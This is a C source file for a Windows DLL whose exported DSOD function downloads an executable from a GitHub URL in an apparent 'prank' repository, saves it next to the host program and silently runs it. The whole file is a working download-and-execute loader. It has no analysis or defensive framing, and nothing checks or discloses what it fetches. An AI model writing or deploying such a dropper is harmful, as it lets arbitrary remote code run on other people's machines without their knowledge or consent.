#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <shlwapi.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")

#define EXPORT __declspec(dllexport)

EXPORT void DSOD() {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    HANDLE hFile;
    char buffer[1024];
    char exePath[MAX_PATH];
    char filePath[MAX_PATH];
    const char* url = "https://github.com/RTBExtreme/DSODPrank/raw/main/DSOD.exe"; 

    // Get the path of the current executable
    if (GetModuleFileName(NULL, exePath, MAX_PATH) == 0) {
        MessageBox(NULL, TEXT("Failed to get executable path"), TEXT("Error"), MB_OK);
        return;
    }

    // Extract the directory path from the executable path
    PathRemoveFileSpec(exePath);
    snprintf(filePath, sizeof(filePath), "%s\\downloaded_file.exe", exePath);

    // Initialize WinINet
    hInternet = InternetOpen(TEXT("Downloader"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        MessageBox(NULL, TEXT("Failed to initialize WinINet"), TEXT("Error"), MB_OK);
        return;
    }

    // Open the URL
    hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        MessageBox(NULL, TEXT("Failed to open URL"), TEXT("Error"), MB_OK);
        InternetCloseHandle(hInternet);
        return;
    }

    // Create or open the file to write
    hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        MessageBox(NULL, TEXT("Failed to create file"), TEXT("Error"), MB_OK);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    // Download the file
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD written;
        WriteFile(hFile, buffer, bytesRead, &written, NULL);
    }

    // Clean up
    CloseHandle(hFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // Execute the downloaded file
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(NULL, (LPSTR)filePath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        MessageBox(NULL, TEXT("Failed to execute file"), TEXT("Error"), MB_OK);
        return;
    }

    // Wait for the process to complete
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}